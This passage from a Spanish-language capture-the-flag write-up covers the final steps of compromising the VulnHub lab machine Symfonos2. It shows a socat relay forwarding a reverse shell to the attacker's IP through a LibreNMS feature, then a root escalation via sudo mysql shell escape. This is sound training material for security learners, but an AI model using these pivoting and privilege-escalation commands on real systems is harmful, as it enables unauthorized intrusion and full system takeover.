Mediante la herramienta `socat` vamos a redirigir las conexiones que entren en la máquina Symfonos por el pueto 4646 a nuestro equipo atacante por el mismo puerto. En una consola a parte volvemos a ganar acceso a la máquina symfonos y ejecutamos socat

```ruby
#Symfonos
bash-4.4$ socat TCP-LISTEN:4646,fork TCP:192.168.1.148:4646
```
En nuestro equipo nos ponemos en escucha en el puerto 4646 y en LibreNMS vamos a Devices > test > Config > Capture > SNMP y ejecutamos con Run

<img src="/assets/VH/Symfonos1-Symfonos2/run.png">

<img src="/assets/VH/Symfonos1-Symfonos2/revshell2.png">

### Escalada de Privilegios (Symfonos2)

* * *

Listando privilegios de sudo vemos que tenemos capacidad de ejecutar binario `mysql` como sudo. Una consulta a [GTFObins](https://gtfobins.github.io/gtfobins/mysql/) nos revela cómo elevar los privilegios

```ruby
cronus@symfonos2:/opt/librenms/html$ sudo -l
Matching Defaults entries for cronus on symfonos2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql
cronus@symfonos2:/opt/librenms/html$ sudo mysql -e '\! /bin/sh'
# id
uid=0(root) gid=0(root) groups=0(root)
```

Hemos completado la máquina **Symfonos2** de VulnHub!! Happy Hacking!!